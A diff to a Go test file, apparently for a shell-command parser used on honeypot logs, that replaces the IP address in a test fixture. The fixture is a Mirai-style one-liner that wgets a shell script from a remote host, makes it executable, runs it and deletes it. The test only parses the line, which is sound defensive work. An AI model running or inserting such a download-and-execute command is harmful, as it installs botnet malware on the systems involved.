@@ -203,7 +203,7 @@ func TestSyntaxErrors(t *testing.T) {
 
 func TestRealMiraiStyleLine(t *testing.T) {
 	// The kind of one-liner honeypots see constantly.
-	line := `cd /tmp || cd /var/run || cd /mnt || cd /root; wget http://185.246.0.1/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh`
+	line := `cd /tmp || cd /var/run || cd /mnt || cd /root; wget http://198.51.100.23/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh`
 	ao, err := Parse(line, exp())
 	if err != nil {
 		t.Fatal(err)
@@ -215,7 +215,7 @@ func TestRealMiraiStyleLine(t *testing.T) {
 	found := false
 	for _, pl := range ao.Pipelines {
 		c := pl.Cmds[0]
-		if c.Args[0] == "wget" && strings.Contains(c.Args[1], "185.246.0.1") {
+		if c.Args[0] == "wget" && strings.Contains(c.Args[1], "198.51.100.23") {
 			found = true
 		}
 	}
